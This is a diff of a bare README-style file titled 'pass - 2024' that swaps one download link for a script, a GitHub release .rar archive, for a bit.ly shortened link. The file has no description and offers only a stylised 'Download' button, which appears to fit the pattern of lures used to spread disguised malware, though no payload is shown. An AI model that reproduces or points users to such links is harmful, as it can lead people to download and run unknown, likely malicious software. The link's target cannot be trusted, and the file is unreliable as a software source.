@@ -1,6 +1,6 @@
 
 
-# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://github.com/nLofibz/gsd3/releases/download/Download/Software.PASS.-.2024.rar)***
+# Click to get the script ===>>> ***[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱 Script](https://bit.ly/4g9kUau)***
 # pass - 2024
 
 ![sddefault](https://github.com/user-attachments/assets/5500de05-95fa-43ac-b30c-ac59e31a1a4f)
